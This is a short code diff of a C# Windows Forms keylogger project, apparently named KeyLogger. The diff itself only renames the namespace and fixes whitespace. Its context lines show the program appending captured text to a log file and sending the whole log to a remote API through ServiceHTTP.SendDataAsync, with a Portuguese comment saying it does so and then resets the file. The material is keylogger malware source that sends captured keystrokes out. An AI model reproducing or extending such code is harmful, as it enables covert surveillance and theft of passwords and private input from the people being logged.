@@ -3,7 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Windows.Forms;
 
-namespace KeyLogger
+namespace KeyLoggerAPP
 {
     public partial class KeyLogger : Form
     {
@@ -73,9 +73,9 @@ namespace KeyLogger
                 string AllText = File.ReadAllText(file.FullName);
 
                 AllText += text;
-                
+
                 // Envia todo o log para a API se tiver sucesso, irá resetar o arquivo
-                if(await ServiceHTTP.SendDataAsync(AllText))
+                if (await ServiceHTTP.SendDataAsync(AllText))
                 {
                     AllText = string.Empty;
                 }
